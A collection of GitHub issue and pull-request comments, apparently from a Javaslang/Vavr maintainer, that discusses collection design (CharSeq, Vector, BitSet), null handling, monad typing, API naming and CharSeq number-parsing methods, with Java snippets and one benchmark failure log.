Errors: 1, Skipped: 0, Time elapsed: 0.27 sec <<< FAILURE! - in javaslang.idiom.ForBenchmark\ntestAsserts(javaslang.idiom.ForBenchmark)  Time elapsed: 0.27 sec  <<< ERROR!\njava.lang.RuntimeException: org.openjdk.jmh.runner.RunnerException: Benchmark caught the exception\n    at javaslang.idiom.ForBenchmark.testAsserts(ForBenchmark.java:29)\nCaused by: org.openjdk.jmh.runner.RunnerException: Benchmark caught the exception\n    at javaslang.idiom.ForBenchmark.testAsserts(ForBenchmark.java:29)\nCaused by: java.lang.AssertionError\n. A blog post would be awesome! I would appreciate to review it before publishing because interpreting benchmarks is a difficult topic. @paplorinc and others may also be interested to take a look!\nActually I don't know how to run the benchmarks :-/ The recent command mvn test -Pbenchmark -pl javaslang does not work any more. I asked @paplorinc for the details and will keep you up-to-date. We will document it, see #1527 \n. @mping Yes, we need that blog post. I would greatly appreciate if you would write a guest post on the Javaslang blog, including your Bio (/Photo etc) :-) The format is would be markdown.\n. I will pull this PR in now - we need to burn down our issues and PRs in order to get forward. Optimizations of the Benchmarks can occur later.\n@mping Many thanks!!\n. @AnthonyKot thank you, I will create an issue. Nice! Thank you.\n. Thanks!\n. @paplorinc nice!\n. Thanks, very concise!\n. Thanks Mr. Euler ;-)\n. Not possible to create that dependency. Adding additional modules is no option - it increases the complexity because of fragmentation.\n. Thank you!\n. Great, thank you!\n. Does it compile with Java 9 and Maven on the command line (without IntelliJ IDEA)?\nIf it is an IntelliJ IDEA related problem we should file a bug.\n. I've created a bug report for the T::compareTo bug, internal review ID : 9044933.\nSee also this Gist.\nUpdate: I filed a JDK 9 bug: http://bugs.java.com/bugdatabase/view_bug.do?bug_id=JDK-8169091\n. @docent thanks for reporting!\n@valery1707 thanks for the analysis! Need to check the code - this is a general problem.\nI will be on holiday in one day (for 4 weeks...) - I will have my notebook with me ;-)\n. @ruslansennov @valery1707 Yes, that looks like a good solution!. Fixed by @ruslansennov . Great!\n. Thx!\n. Great, thx!\n. Sounds good! We should do the following:\nUse Value instead of Traversable and ? super T in the argument\njava\n<T> Predicate<Value<T>> exists(Predicate<? super T> predicate)\nAlso add a forAll:\njava\npublic static <T> Predicate<Value<T>> forAll(Predicate<? super T> predicate) {\n    Objects.requireNonNull(predicate, \"predicate is null\");\n    return obj -> obj.forAll(predicate);\n}\n(I've also omitted the final keyword for method parameters)\n\nUpdate: We might need Predicate<? extends Value<T>> as return type. Need to check that first!. Fixed with #1920 . Thank you for your suggestion. A mutable List / ListBuffer is out-of-focus for Javaslang. We will only provide the missing immutable collections.\nConsider prepending elements and then reverse or use Vector instead.\n. Great, this makes sense. Thank you.\n. This one was merged into 3.0.0 branch. Because 3.0.0 was deleted, we cherry-picked this change via #1609\n. Thanks for reporting. I think you are right!\n. Fixed with #1476 \n. Thank you! Will close #1475 after merge.\n. Huh!? I thought I've merged this because I already closed #1475. Strange. I'm still on vacation and the internet connection is not that good here on the beach. The merge request may have been ended in the nirvana...\nI will merge it now to get the Utils bug-fix in. Further optimizations can be made later if needed.\n. Great, thank you!\n(Just saw, that we can improve CharSeq.mkString() and opened #1496)\n. Hi & thx :)\n. Yes, that would be great :-))\n. We should stay with the current implementation. CharSeq is effectively a rich string. Some operations are expected to be linear in time.\nThe memory footprint matters. Strings are beside numbers the most commonly used language features. In general I expect many small strings instead of many very big ones. For very small n O(n) is nearly O(1).\nIf operations are performed that require heavy CPU utilization, the user might take another way to leverage the (new) Vector performance, e.g. by using toVector().\nMany operations are specific to the underlying String. It is important to us that these String operations perform the same as known from ordinary Strings. The current changes require us to utilize additional CPU/Mem by first calling toString. Example: toString().offsetByCodePoints(index, codePointOffset)\nSo please understand that CharSeq will stay as is.\n. Let's keep CharSeq and BitSet as is and make Vector the best immutable Vector available on the JVM :-)\nDon't just look at the O(x) complexity. E.g. if the tail operation is never called by users it does not matter. Also O(n) is nearly O(1) for small n.\nWe should not give up the special internal impls of CharSeq and BitSet.\nPlease focus on Vector solely.\n. I have the feeling that we are measuring what we want to see. My experience says that the whole picture has more facets than just the measurement of repeated method calls.\n- I think that memory fragmentation may also play a role because Vector has a Tree structure\n- I expect Strings to be copied continuous/coherent. Memory can be released relatively simple. (That's just my intention. I don't know how the G1 garbage collector works in particular.)\n- I trust the JVM handling Strings efficient. JVM architects are still optimizing it.\nWhich method calls did we measure? Typical String operations are substring, replaceAll, ...  How do these operation perform now?\nOur benchmarks run in theoretically infinite memory without garbage collection, right, or did we change that setting? A real world app also has GC timeouts. I know that collecting the garbage of many Vector operations will be definitely more cost intensive than freeing mem of Strings.\nI don't think this PR will make it into master.\n. @paplorinc CharSeq IS DESIGNED TO BE AN ENHANCED STRING. It contains extension methods. The implementation is based on the delegate pattern.\n\nFirst question: Why do we not implement all other collections based on Vector?\n(The following is intentionally written in an exaggerated style to draw an expressionism-like picture.)\n\nE.g. starting with Array? Your Vector implementation seems to be the most sophisticated collection in the code base.\nWe could even improve the time complexity of nearly all List methods. Why do we not implement List based on Vector? It may use a little more memory but I think in many cases it can be amortized. If we have List then we also have Queue and Stack.\nLet's do Map based on Vector, then we have also Sets.\nWe could include some if-branches for the lazy case (like for primitive specializations). Then the Vector could also be used to implement the lazy collections.\nI am convinced that the benchmarks will prove that the new methods we measure perform way better than the old ones. So why do we not implement our collections based on Vector?\nThe answer is left to the reader.\n\nSecond question: Why does the JVM not use an immutable data structure like the new Vector to implement Strings?\nI don't know. There must be a reason.\n. @valery1707 I would love to see a real world application before. I have a compiler application in mind that reads source files (based on strings/CharSeq), transforms these into abstract syntax trees and further processes these trees by generating output files. This is a typical, real-world application heavily depending on string operations. This would us give the opportunity to see how the memory/GC behaves.\nI've started to implement a parser framework as part of Javaslang in the very beginning (see the parser branch). CharSeq was intended to be a step towards this parser. The parser framework should be a replacement for Antlr. It is intended to be much simpler to use but at least similar powerful/feature rich. The key feature is that it combines the lexer and parser stages. I'm convinced it is possible. It all boils down to handle whitespace correctly...\n. Just one more word for clarification: CharSeq is a String. We can't give up that constraint. In other words toString needs to perform in O(1).\nIn fact we would have named it javaslang.collection.String or javaslang.String but it would raise a conflict with the default import java.lang.String.\nIf Java had extension methods (or java.lang.String were not final) we would not have created the new type CharSeq. But creating a wrapper is the only solution.\nHaving the above in mind, changing the type of CharSeq would change the whole idea of a rich String. CharSeq would degrade to an ordinary collection of characters.\n. @zsolt-donca interesting idea. A Builder would require to have intermediate operations, like in Java's Stream. The toString would finally create a String. If the Builder would be a Vector we would have problems implementing the original java.lang.String methods, such as replaceAll(regexp, string).\n@paplorinc yes, because it is mutable I think...\n. @zsolt-donca Some random thoughts while reading your ideas:\n- Something like an immutable CharSeqBuilder with better performance characteristic (cpu/mem) sounds interesting.\n- It could be even CharSeq.Builder which is instantiated with CharSeq.builder() CharSeq.builder(CharSequence). A CharSeq could be obtained by builder.toCharSeq() then. Maybe we could make CharSeq an interface that is implemented by an internal CharSeqImpl and by CharSeq.Builder.\n- While writing this I think we should change CharSeq.of(String) to CharSeq.of(CharSequence) and internally initialize the backing String with this.back = charSequence.toString(). For String it will remain an O(1) operation.\n- Update: We chose of(String) because CharSeq is a rich String. But widening the argument type seems to be more user-friendly.\n- The name 'Builder' is a little bit weird because it brings mutability to my mind. But that does not really matter. The pattern is the same, even if an immutable context. So Builder is the right name.\nI have some thoughts on the current Vector implementation, also regarding some specializations - but that is another topic and should not impact the general O(x) performance of an imaginary CharSeq.Builder. I will write these thoughts in the Vector improvement PR...\n/cc @paplorinc @valery1707 \n. > Besides the obvious solution of making a separate builder class, I think this implementation could become a builder and have an O(1) toString at the same time.\nThat's what I'm also thinking about. The CharSeq String impl and the CharSeq Vector impl would be roughly the same (both immutable, both the same interface) with different performance characteristics.\nHaving two impls and calling toString in the end is a solution. The CharSeq could be initialized with the String impl and ~~only 'fall back'~~ jump to the Vector impl on specific operations. It would be a ping-pong between the impls. Just an idea from the top of my head. Does this make sense?\n. Awesome, thank you!\n. I'm not sure about allowing null values. An alternative is to prohibit null as part of the interface documentation.\nIn native Java the min and max functions are only available in primitive Streams, like IntStream. My vision is to further restrict the types when future Java versions allow us to do so. Currently an extension of the type system is investigated as part of project Valhalla:\n\nFor now I suggest to filter the values in order to get sure null values are handled properly:\njava\nList.of(null, 0, null, 1, null) . filter(Predicates::isNotNull) . min();\nI will update the min/max documentation accordingly.\n. Arithmetic operations should only process on defined element.\nE.g. 1 + null is not 1. I would say it is undefined because our arithmetic has no notion for adding an element outside the set of ints to an int.\nSo why max(1, null) should be 1?\nA healthy codebase does not implement additional logical branches for every special case and his dog :-) We should do it as straight forward as possible.\nTherefore we will not include special null handling here.\n. > I would ban null values everywhere, muhahahaha :trollface:\nYEAH - and the user has to SUFFER if he uses null values, MUHAHAHAHA \ud83d\udc79 \n. @eirikm yes, that's right. We should throw something like an ArithmeticException in such cases. Thanks for the hint!\n. We can't easily intercept a min/max computation and map a NPE to an ArithmeticException. This is because min/max internally call minBy/maxBy, which take a custom Comparator. A custom Comparator can throw a NPE for another reason, so we can't catch the NPE and rethrow an ArtithmeticException.\nTherefore we don't do it more complicated than it should be. Plain Java acts like this:\n``` java\n// throws NullPointerException\nStream.of(null, 1).min(Integer::compare);\n// throws NullPointerException\nStream.of(1, null).min(Integer::compare);\n```\nWe will act the same way. This is just one extra check in min()/max(), if the head element is null.\n. The simple solution works for all collections but TreeSet/RedBlackTree. Needs further investigation.\nBtw - all SortedMap and SortedSet implementations should at least override min() because that is the head() element (if present).\n. Yep, will close this. Thx!\n. Hi Lorinc,\nthank you for the investigation and the resulting insights. Javaslang will not provide specializations for generic types (at least in the core module). My vision is to leverage http://openjdk.java.net/jeps/218 to get around the current restrictions of generics.\nWe could think about an additional module (javaslang-specialized?) that contains special versions of our collections but I think it is not worth the effort - it will lead to a maintenance hell because all changes to the core have to be duped to that module. Who will maintain it over time?\nFrom the very beginning of Javaslang I decided to live with the shortcomings of the language (null, Objects vs. primitives, ...). That's the reason there are no specializations.\nDD\n. I think my comment on CharSeq optimization also applies here. We should stay with the current impl in favor of a better memory footprint.\nFrom wikipedia: \"A bit array is effective at exploiting bit-level parallelism in hardware to perform operations quickly.\" That said using a Vector as backend we loose important characteristics of our low-level implementation.\nLet's stay with our current impl please.\n. BitSet will probably not part of Vavr 1. We want to focus on the most frequently used collections. Maybe we will release some kind of add-on collections package later.. Thx!\n. PR #1485 is a first step\n. This is about naming. We should not break backward-compatibility. I will close this ticket.\n. Thanks!\n. Yes, better.\n``` java\n// mutable/immutable get\nval elem = seq[index];\n// mutable set (immutable operation not possible this way)\nseq[index] = elem;\n// immutable update\nvar seq = seq.update(index, elem);\n```\n. You are right - it is already there o_O\nThx!\n. The names drive me crazy. We have grouped and sorted like in Scala, but update and reverse. Also replace instead of replaced, prepend instead of prepended etc. However, we will keep it as-is for now, sorted and grouped will be the only xxx-ed versions.\n. Nice, thank you :)\n. Thanks!\n. # Consideration removing Kind1/Kind2 from core lib\nJavaslang claims to be a functional programming library. The algebraic computation layer is important for some of our users. So I ask the question if we can remove Kind1/Kind2 from the javaslang core module while preserving the algebraic extensions contained in the javaslang-pure module.\nStatus Quo\nCurrently Kind1/Kind2 live in the javaslang project. These are recursive type definitions without methods:\n``` java\npublic interface Kind1, T> {\n}\npublic interface Kind2, T1, T2> {\n}\n```\nThese interfaces tag types (e.g. List<T>) that can be decomposed into\n1. The context type (e.g. List)\n2. The value type (e.g. T)\nThe List interface currently looks like this:\njava\npublic interface List<T> extends Kind1<List<?>, T>, LinearSeq<T>, Stack<T> {\n    ...\n}\nIn javaslang-pure the Monad lifts 'ordinary' functions to functions that operate in a monadic context (read: on Monad):\n``` java\npublic interface Monad, T> extends Functor {\n<U> Monad<M, U> flatMap(Function<? super T, ? extends Monad<M, U>> mapper);\n\n@Override\n<U> Monad<M, U> map(Function<? super T, ? extends U> mapper);\n\nKind1<M, T> narrow();\n\n}\n```\nThe narrow function is the important part. It allows us to transform the Monad type back to real object type, which is needed to implement Monad.flatMap().\nExample: List\njava\nstatic <T> Monad<List<?>, T> of(List<T> list) {\n    return new Monad<List<?>, T>() {\n        @Override\n        public <U> Monad<List<?>, U> flatMap(Function<? super T, ? extends Monad<List<?>, U>> f) {\n            return Monad.of(list.flatMap((T t) -> (List<U>) f.apply(t).narrow()));\n        }\n        @Override\n        public <U> Monad<List<?>, U> map(Function<? super T, ? extends U> f) {\n            return Monad.of(list.map(f));\n        }\n        @Override\n        public List<T> narrow() {\n            return list;\n        }\n    };\n}\n\nTrying to remove Kind1\nOur goal is to remove Kind1 from the javaslang core module, e.g.\njava\npublic interface List<T> extends LinearSeq<T>, Stack<T> {\n    ...\n}\nThe javaslang-pure module is adjusted like that:\n``` java\npublic interface Monad extends Functor {\n<U> Monad<M, U> flatMap(Function<? super T, ? extends Monad<M, U>> mapper);\n\n@Override\n<U> Monad<M, U> map(Function<? super T, ? extends U> mapper);\n\nM narrow();\n\n}\n```\nThe List Monad implementation is then constructed as follow:\njava\nstatic <T> Monad<List<?>, T> of(List<T> list) {\n    return new Monad<List<?>, T>() {\n        @Override\n        public <U> Monad<List<?>, U> flatMap(Function<? super T, ? extends Monad<List<?>, U>> f) {\n            return Monad.of(list.flatMap((T t) -> (List<U>) f.apply(t).narrow()));\n        }\n        @Override\n        public <U> Monad<List<?>, U> map(Function<? super T, ? extends U> f) {\n            return Monad.of(list.map(f));\n        }\n        @Override\n        public List<T> narrow() {\n            return list;\n        }\n    };\n}\nThe case (List<U>) f.apply(t).narrow() is unsafe. It is correct but cannot be verified by the compiler because Monad.narrow() return M, which is List<?> instead of List<U>.\n\nRemoving Monad.narrow() but keeping Kind1\nThis leads to:\n``` java\npublic interface Monad, T> extends Functor {\n<U> Monad<M, U> flatMap(Function<? super T, ? extends Monad<M, U>> mapper);\n\n@Override\n<U> Monad<M, U> map(Function<? super T, ? extends U> mapper);\n\n}\n```\nThe List Monad implementation can be made safe by making use of intersection types. We can just add the Kind1 interface to the type List (and name it M) because Kind1 contains no methods.\njava\nstatic <T, M extends List<?> & Kind1<M, ?>> Monad<M, T> of(List<T> list) {\n    return new Monad<M, T>() {\n        @Override\n        public <U> Monad<M, U> flatMap(Function<? super T, ? extends Monad<M, U>> f) {\n            return Monad.of(list.flatMap((T t) -> (List<U>) f.apply(t)));\n        }\n        @Override\n        public <U> Monad<M, U> map(Function<? super T, ? extends U> f) {\n            return Monad.of(list.map(f));\n        }\n    };\n}\nNow narrow() is gone and (List<U>) f.apply(t) is safe.\nBut we loose a common Monad.narrow() in favor of removing Kind1 (and Kind2) from the javaslang core module. This is not eligible because at some point we may want to return from the abstract algebraic computation layer back to the core library layer.\nHaving said this, we will stay with Kind1, Kind2 in the core lib and also keep javaslang-pure.\n\nSee also\n- Monads in Javaslang\n- Lifting a Function T -> R to operate on Monads\n. ## CharSeq\n\nrename Seq<CharSeq> splitSeq(...) to Seq<CharSeq> split(...) (CharSeq[] split(...) will be removed). @nfekete We will take it into account. There are some interesting ideas, I opened a separate issue: #1905. @valery1707 Do you have a suggestion what an 'empty' lazily evaluated value could be?\nPlease also take a look at #1861\n\nI understand declaring a value as 'lazy' means, that there is a value but the evaluation is deferred to the moment the value is needed. Especially we currently can rely on the fact that such a value is always present.\nIf we allow Lazy to be also empty (read: undefined), it is more like a LazyOption. We could do the same for all other Vavr types, e.g. LazyTry, LazyEither, LazyXyz...\nMaybe Lazy should be more like a lazy view or decorator for existing types. E.g. instead of Lazy<T> we might want to have Lazy<Option<T>>.\n. @valery1707 nevertheless, your point is valid. I will think about Lazy (filter) for 1.0.0. @nfekete I think Lazy.filter cannot be expressed in the way that the result is lazy\n```java\n{ // variant 1: still has a sub-optimal filter\n    Lazy> lazyOption = Lazy.of(() -> Option.of(...));\n    Option> filtered = lazyOption.filter(predicate);\n}\n{ // variant 2: not lazy anymore, also not what we want to express\n    Option> optLazy = Option.of(Lazy.of(() -> ...));\n    Option> filtered = optLazy.filter(predicate);\n}\n```\n. @valery1707 thx for clarification! That's a really nice solution!\nWe should Lazy.filter accordingly! I created #2178\n. Created separate issues for the remaining tasks. See #2182, #2183\nWill close this issue.. This issue goes adhere with #1488\n. See also #1635 \n. Thx @valery1707, I like it. I think the aliases will come handy to make code more concise!\n. Great work so far, thank you. I can't just pull it in because I'm still not sure about the function names.\nIn near future there will be also CheckedConsumer, CheckedBiConsumer, CheckedRunnable, CheckedSupplier, CheckedPredicate, CheckedBiPredicate. Or maybe CheckedConsumer1..8, CheckedPredicate1..8 - not sure yet. But we need abbreviations for these, too.\nI think these names are better:\n- function0..8 - Function0..8\n- checkedFunction0..8 - CheckedFunction0..8\nand later:\n- checkedSupplier - CheckedSupplier\n- checkedRunnable - CheckedRunnable\n- checkedPredicate1..8 - CheckedPredicate1..8\n- checkedConsumer1..8 - CheckedConsumer1..8\nExample (future Java version):\njava\nval foo = checkedFunction2(this::bar);\n. @valery1707 please rename f0..8 to function0..8 and cf0..8 to checkedFunction0..8.\n. Great, thanks! These will be really useful to users. Take your time.\n- Daniel\n. @valery1707\n\nWhat alias use for Function1..8/CheckedFunction1..8?\n\nWe go with the long names function1..8()/checkedFunction1..8(). Otherwise we will regret it when introducing more function types (Consumer, Runnable, Supplier, Predicate etc.)\n. @paplorinc\n\ndo we need these?\n\nThere is one thing that still bothers me - we will have mixed upper case and lower case factory methods, e.g.\n- upper case API.Option() but lower case Option.some(), Option.none()\nThis idea is still unfinished...\n. Yes, that's a valid solution I also currently think about.\nFirst view of things: Have consistent/equal naming throughout all Javaslang classes and interfaces\nDeconstructors (read: unapply patterns) and constructors are dual. This should be reflected by the name. I think we have two options: both upper- or both lower case. Distinguishing them is mandatory. A prefix should work fine ('$' would integrate well for the patterns).\nThese are our options:\n- All methods upper or all lower case, e.g. Some()/$Some() vs some()/$some()\n- Define all methods within javaslang.API or all within related types or a hybrid solution\nEach type has several of and ofAll methods in general. When adding new factory methods we concentrate on of(T) and of(T...).\nLooking at Option we will take one of these approaches:\n- API.Option(T), API.Option(T...) and Patterns.$Option()\n- API.option(T), API.option(T...) and Patterns.$option()\n- Option.Option(T), Option.Option(T...) and Patterns.$Option()\n- Option.option(T), Option.option(T...) and Patterns.$option()\nSecond view of things: We could define the following in idiomatic Javaslang\nI like to just import static javaslang.API.* and then start to write Javaslang using Match, For and almost all of the Values, Tuples and (Checked)Functions.\n- Static factory methods related to types are lower case and not intended to be imported statically, e.g. we always use Option.some(...) instead of some(...). This would go adhere with of and ofAll.\n- The javaslang.API is intended to be used as static import only. E.g. we write For and Match instead of API.For and API.Match.\n- API contains the keywords of the Java slang. These keywords are all upper-case in order to circumvent name-clashes with default Java. E.g. we have For and Try(() -> computation) instead of for and try(() -> computation()).\n- We would then add also API.Some() and API.None() in addition to Option.some() and Option.none().\nIn other words Some(...) and Option.some() are different in the way they are used, the former as static import, the latter full qualified. The case indicates the usage.\nPatterns are prefixed upper-case, e.g. $Some(...).\n. Thank you @valery1707! This looks great! We still will have some changes regarding naming.\nI have an idea regarding the Patterns vs the aliases. Maybe we can fuse these concepts.\nExample: Option\nThe Option patterns look like this:\n``` java\n    public static  Pattern1, _1> Some(Pattern<_1, ?> p1) {\n        return Pattern1.of(Option.Some.class, p1, javaslang.$::Some);\n    }\npublic static <T> Pattern0<Option.None<T>> None() {\n    return Pattern0.of(Option.None.class);\n}\n\n```\nwhere Pattern0 and Pattern1 are defined like this:\n``` java\npublic interface Pattern extends java.util.function.Function> {}\npublic static abstract class Pattern0 implements Pattern { ... }\npublic static abstract class Pattern1 implements Pattern { ... }\n```\nI'm not sure why I made Pattern0 .. Pattern1 abstract classes instead of interfaces. (There was a reason, I have to investigate...). But if these could be interfaces, Option.None could directly implement Pattern0 and Option.Some could implement Pattern1.\nThen the aliases Some(...) and None() would be both, instances of Option and also patterns that can be used with pattern matching.\nThe borderline is, that Objects have a constructor and also an unapply method. It is still just an idea - I need to play around with it...\nI will continue the review tomorrow, need some sleep :)\n. @valery1707 \n\nWhat aliases we need for access for LinkedHashSet, HashSet, LinkedHashMap, HashMap?\n\nSee my comment\n\nShould all aliases start with lower case or upper case character?\n\nWe target upper case. (This will solve also the problem with 'Try'  vs 'try')\n. @valery1707 Thank you! Before we go on I need to prepare some things.\nI don't think that API#None clashes with $#None and Patterns#None. This is only the case then both are imported. I will deprecate $and Patterns, not with the intend to remove them (which would break existing apps) but with the intend not to use them any more. API.* will be a replacement.\nI thought about letting all Values extend some sort of pattern, e.g.\njava\ninterface HashSet<T> implements Pattern... {\n    Tuple... unapply() {\n        return ...;\n    }\n}\nBut this will cause problems within the type hierarchy I think. We do want to unapply a Set, a SortedSet, etc. But only one of them can implement a Pattern.\nThere might be another solution: Maybe it is practicable to return joint union in type parameters:\n``` java\n & Pattern0> T Set() {\n    return ...\n}\n & Pattern2> T Set(T head, T... tail) {\n    return ...\n}\n```\nOption(t), None() and Some(t) all need to return an Option. This is important for correct type-inference in other expressions. I have to ensure that inference still works with the joint union solution above.\nBy using only interfaces (e.g. Set and Pattern*), we are able to provide runtime implementations (Proxies). But I don't want to have this overhead. Maybe there is another solution.\nThere's still something to do for me before we can pull this change in. It is important to get the basis right because if we release something we cannot change it without breaking existing code.\nStay tuned! I think I will first pull in @paplorinc's Vector optimizations. He's waiting for so long now...\n. Great work @valery1707 - the users will definitely love this one :-)\n. @ruslansennov The build currently fails - the GWT module says it has no sources for Future etc. Could you take a look please? I have no idea what to do...\nDoes @valery1707 need to merge with master again because we pulled in GWT support yesterday?\nThank you :-)\n. @valery1707 One more thing: for Maps (Map, SortedMap, LinkedMap) we need also the following, which is one of the main initializers I currently use because of its conciseness:\njava\nMap(\n  1, \"a\",\n  2, \"b\",\n  3, \"c\"\n);\nExample implementation:\njava\npublic static <K, V> HashMap<K, V> Map(Object... pairs) {\n    return HashMap.of(pairs);\n}\n. I know that Map pair initializers are unsafe. But they will most probably come to the JDK also! See JEP 269\n. @valery1707 @paplorinc Let's keep Map(Object...).\nI know, it is unsafe, but it is a static constructor. Code that fails will most probably fail on first run and can be fixed. Let's do it this way.\n. @valery1707 no @Deprecated for now...\n. @valery1707 Yes, awesome job!!\n\nAfter the PR is before the PR :) Therefore I want to share some thoughts with you.\n@paplorinc  talked to me because I rejected a change that was unsafe (toJavaArray(Class<? super T>)).\nAnd Lorinc is also right when saying that Map(Object...) is unsafe. Stuart Marks explained in his JavaOne 2016 Session Collections Refueled how and why the Java language architects implemented JEP 269.\nThe essence regarding Map.of()is best described by this image:\n\nJavaslang needs to be safe. We will follow the decisions made in JEP 269 and therefore we will deprecate or *Map.of(Object...) methods and strongly discourage using them. Instead we will add methods\n- of(K k1, V v1)\n- of(K k1, V v1, K k2, V v2)\n- ...\nup to 10 key/value pairs. For more than 10 pairs we need to use tuples:\n- of(Tuple2<? extends K, ? extends V>...)\nAccordingly we will also deprecate ofEntries(Tuple2<? extends K,? extends V>...).\n(See also #1608)\nAnother pain-point is the long name 'Tuple(...)'. Lorinc asked to shorten the alias, say to T(...). I share Lorinc's opinion that Tuple is not concise. But T (or any other abbrev.) is too cryptic. In pure Java we write entry(...) to obtain a Map.Entry. We will also write the full name Tuple.\n\nPlease don't think that some of the changes we made here are unnecessary. From the local viewpoint, HashMap.of(Object...) is what we currently have. We did not release the new API, so we are able to improve things afterwards. I think it should be ok when we change API#Map methods together with our Hash/Tree/LinkedHash-Map.of(Object...) methods in one PR.\nAgain, awesome work!\nThank you\nDaniel\n. Thanks, finished my review of this PR, please find my comments attached. I like the simplifications!\n. Thanks! Merging now the first step towards the new Vector :)\n. Build fails with\nbash\n[ERROR] /home/travis/build/javaslang/javaslang/javaslang-benchmark/src/test/java/javaslang/collection/CharSeqBenchmark.java:[54,98] method equals in class java.lang.Object cannot be applied to given types;\n  required: java.lang.Object\n  found: char[],char[]\n  reason: actual and formal argument lists differ in length\n. For me it looks good so far. I can pull it in if the System.outs are removed...\n. I received an email\n\n\n+\n+import java.io.Serializable;\n+import java.util.function.Function;\n+\n+import static javaslang.collection.Arrays.*;\n+\n+final class BitMappedTrie implements Serializable {\n+    static int BRANCHING_BASE = 5;\n+    static int branchingFactor()                   { return 1 << BRANCHING_BASE; }\n+    static int firstDigit(int num, int depthShift) { return num >> depthShift; }\n+    static int digit(int num, int depthShift)      { return lastDigit(firstDigit(num, depthShift)); }\n+    static int lastDigit(int num)                  { return num & (-1 >>> -BRANCHING_BASE); }\n+\n+    private static final long serialVersionUID = 1L;\n+\n+    private static final BitMappedTrie<?> EMPTY = new BitMappedTrie<>(emptyArray(), 0, 0, 0);\nwill rename this to empty\n\n\nCan't find it any more on the PR but have one question. What do you mean - renaming EMPTY to empty? Just asking because static final fields are by convention upper-case...\n. Would be so great if @djspiewak could take a look. Could be of interest for #Scala also!\n. We can optimize the partition method, which currently first fills an ArrayList, then calls  ofAll(Iterable), which internally calls trie.append:\njava\n    @Override\n    public Tuple2<Vector<T>, Vector<T>> partition(Predicate<? super T> predicate) {\n        Objects.requireNonNull(predicate, \"predicate is null\");\n        final ArrayList<T> left = new ArrayList<>(), right = new ArrayList<>();\n        for (int i = 0; i < length(); i++) {\n            final T t = get(i);\n            (predicate.test(t) ? left : right).add(t);\n        }\n        return Tuple.of(ofAll(left), ofAll(right));\n    }\nI think we could save CPU + Mem by calling trie.append directly:\njava\n    @Override\n    public Tuple2<Vector<T>, Vector<T>> partition(Predicate<? super T> predicate) {\n        Objects.requireNonNull(predicate, \"predicate is null\");\n        final BitMappedTrie<T> left = BitMappedTrie.empty(), right = BitMappedTrie.empty();\n        for (T t : this) {\n            if (predicate.test(t)) {\n                left = left.append(t);\n            } else {\n                right = right.append(t);\n            }\n        }\n        return Tuple.of(ofAll(left), ofAll(right));\n    }\nWe can also iterate elements instead of calling get for each element.\n\nQuestion: Does the JVM optimizes length() calls here? It can't know that Vector is immutable and the value never changes...\n\nfor (int i = 0; i < length(); i++) {\n\nWouldn't it be better to first store length() in a variable and then check against that?\n\nfinal int length = length();\nfor (int i = 0; i < length; i++) {\n. ok, thank you, pulling it in now\n. Hi @AlparSzabados, thank you for asking. I've re-read the Java API (Serializable, Class) and googled a bit. I cannot find a clear advice how Serializable is used throughout a type hierarchy. It boils down to:\n1. Let an interface implement it to make it clear as part of the contract that implementations are Serializable (that's how we do it now)\n2. See serializability as implementation detail because we cannot enforce/to be sure that implementations will really implement Serializable. (however, I think it is a marker interface that does not need to be implemented)\n3. everything in between 1. and 2. (like this issue)\n\nThinking again about it I think we should stay with 1. We do not need to be what I called 'refactoring-safe' because Serializable is part of the contract of the super-types.\nLet every type that has a serialVersionUID implement Serializable seems unnecessary for me. Keeping things simple means leaving things away without changing functionality.\nI will close this issue.\n@AlparSzabados thanks again for asking!\n. Looks great, thanks!\n. Hi @ronanM, thank you for the new PR. Mmhh, but I don't see the changes. This PR states 0 changed files. Am I missing s.th.?\nThanks for your help!\n. Thanks - I'm also no git expert. \u2728It's a kind of magic\u2728 :-)\n. Thanks for bearing up with me. Nice change!\n. Nice and clean solution, thanks!\n. Thank you!\n. I will replace every abstract, package-private super class in a separate PR in order to make it easier to merge changes into the 2.0.3 branch.\n. Interesting - looking forward to see an optimization!\n. Wow - sophisticated. I was curious and changed the collections to Stream (instead of CharSeq and List). The tests then ran in 428 ms on my machine. Your version is better, it runs in 286 ms on my machine.\nGreat, thx!\n. Very nice solution, thanks!\n. Let's take a look at Java's Long conversions (omitting radix for now). In particular this is a good example because the names of the class and the primitive type are identical (Long and long as apposed to Integer and int).\n- Long.decode(String) parses a String to a Long object according to a specific grammar (including decimal, hex and octal numbers)\n- Long.parseLong(String) parses a String to a primitive long using radix 10\n- Long.parseLong(String, int) parses a String to a primitive long using a specific radix\n- Long.parseUnsignedLong(String) parses a String to a unsigned primitive long using radix 10\n- Long.parseUnsignedLong(String, int) parses a String to a unsigned primitive long using a specific radix\n- Long.valueOf(String) first parses a String to a primitive long using radix 10, then boxes it in a Long object\n- Long.valueOf(String, int) first parses a String to a primitive long using a specific radix, then boxes it in a Long object\nIn Javaslang conversion methods are named toXxx(). But I think it is best to align to Java's naming here:\n- charSeq.decodeLong() calls Long.decode(charSeq.mkString())\n- charSeq.parseLong() calls Long.parseLong(charSeq.mkString())\n- charSeq.parseLong(radix) calls Long.parseLong(charSeq.mkString(), radix)\n- charSeq.parseUnsignedLong() calls Long.parseUnsignedLong(charSeq.mkString())\n- charSeq.parseUnsignedLong(radix) calls Long.parseUnsignedLong(charSeq.mkString(), radix)\n- charSeq.toLong() calls Long.valueOf(charSeq.mkString())\n- charSeq.toLong(radix) calls Long.valueOf(charSeq.mkString(), radix)\n... because I cannot come up with any good names starting with to...:\n- charSeq.to_long() or charSeq.toPrimitiveLong()\n- charSeq.to_unsigned_long() or charSeq.to_ulong() or charSeq.toPrimitiveUnsignedLong()\n- charSeq.toLong()\n- charSeq.toDecodedLong()\nWe implement the following methods\nBoolean:\n- charSeq.parseBoolean()\n- charSeq.toBoolean()\nByte:\n- charSeq.decodeByte()\n- charSeq.parseByte()\n- charSeq.parseByte(radix)\n- charSeq.toByte()\n- charSeq.toByte(radix)\nDouble:\n- charSeq.parseDouble()\n- charSeq.toDouble()\nFloat:\n- charSeq.parseFloat()\n- charSeq.toFloat()\nInteger:\n- charSeq.decodeInteger()\n- charSeq.parseInt()\n- charSeq.parseInt(radix)\n- charSeq.parseUnsignedInt()\n- charSeq.parseUnsignedInt(radix)\n- charSeq.toInteger()\n- charSeq.toInteger(radix)\nLong:\n- charSeq.decodeLong()\n- charSeq.parseLong()\n- charSeq.parseLong(radix)\n- charSeq.parseUnsignedLong()\n- charSeq.parseUnsignedLong(radix)\n- charSeq.toLong()\n- charSeq.toLong(radix)\nShort:\n- charSeq.decodeShort()\n- charSeq.parseShort()\n- charSeq.parseShort(radix)\n- charSeq.toShort()\n- 